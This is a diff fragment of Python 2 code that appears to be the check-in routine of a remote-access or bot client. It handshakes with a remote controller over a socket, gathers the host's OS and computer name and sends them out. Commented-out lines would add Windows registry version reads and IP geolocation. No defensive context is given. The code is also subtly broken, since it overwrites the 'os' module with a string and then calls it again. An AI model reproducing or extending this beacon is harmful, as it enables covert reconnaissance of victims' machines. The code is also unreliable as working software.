@@ -1,0 +1,36 @@
+while flag:
+    s.send("Connecting")
+    time.sleep(1)
+    response = ''
+    response = s.recv(1000)
+    time.sleep(1)
+    if response == 'Accepting':
+        flag = False
+
+#myip = socket.gethostbyname(socket.gethostname())
+#mycountry = geoip.country(myip, 'winip.dat')
+#os = get_registry_value("HKEY_LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName")
+#sp = get_registry_value("HKEY_LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion")
+#build = get_registry_value("HKEY_LOCAL_MACHINE", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuildNumber")
+#finalOS = "%s %s (build %s)" % (os, sp, build)
+#s.send(mycountry)
+try:
+    os = os.getenv('OS')
+    compname = os.getenv('COMPUTERNAME')
+    finalOS = "OS=%s --- ComputerName=%s" % (os, compname)
+except:
+    #print "Failed first OS check"
+    try:
+        os = os.getenv('OS')
+        finalOS = "OS=%s" % (os)
+    except:
+        finalOS = "Failed to get Data"
+        #print "Failed second OS check"
+s.send(finalOS)
+response = s.recv(1000)
+if response == 'Connected':
+    print "Connected"
+    connected = True
+    time.sleep(3)
+    
+    
